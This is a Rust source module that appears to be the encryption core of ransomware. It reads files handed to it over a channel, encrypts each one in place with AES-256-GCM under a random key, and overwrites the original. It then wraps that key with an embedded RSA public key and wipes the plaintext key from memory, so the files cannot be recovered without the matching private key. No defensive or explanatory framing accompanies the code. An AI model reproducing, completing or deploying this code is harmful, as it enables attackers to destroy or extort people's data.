use std::fs::DirEntry;
use std::fs::{read, write};

use crossbeam_channel::Receiver;
use openssl::rand::rand_bytes;
use openssl::rsa;
use openssl::symm::{encrypt, Cipher};
use tracing::{event, Level};
use zeroize::Zeroize;

use crate::PUB_KEY;

pub(crate) fn generate_key() -> Vec<u8> {
    let mut key = vec![0 as u8; 32];
    rand_bytes(&mut key).unwrap();
    key
}

pub(crate) async fn encrypt_files(r: Receiver<DirEntry>, mut key: Vec<u8>) {
    event!(Level::DEBUG, "Encryption worker started.");
    while r.len() != 0 {
        if let Ok(file) = r.recv() {
            event!(Level::DEBUG, "Processing file: {:?}", file);
            let content = read(file.path());
            if content.is_err() {
                continue;
            }
            let mut iv = generate_key();

            if let Ok(mut output) = encrypt(
                Cipher::aes_256_gcm(),
                &key,
                Some(&iv),
                &content.as_ref().unwrap(),
            ) {
                output.append(&mut iv);
                let _ = write(file.path(), &output);
                output.zeroize();
            }
            content.unwrap().zeroize();
        }
    }
    event!(
        Level::DEBUG,
        "Channel is empty, zeroing memory and killing worker."
    );
    key.zeroize();
}

pub(crate) fn wrap_key(key: &Vec<u8>) -> Vec<u8> {
    let rsa_key = rsa::Rsa::public_key_from_pem(PUB_KEY).unwrap();
    let p_key = openssl::pkey::PKey::from_rsa(rsa_key).unwrap();
    let encryptor = openssl::encrypt::Encrypter::new(&p_key).unwrap();
    let buffer_len = encryptor.encrypt_len(&key).unwrap();
    let mut encrypted = vec![0u8; buffer_len];

    // Encrypt the data and discard its length
    let _ = encryptor.encrypt(&key, &mut encrypted).unwrap();
    return encrypted;
}
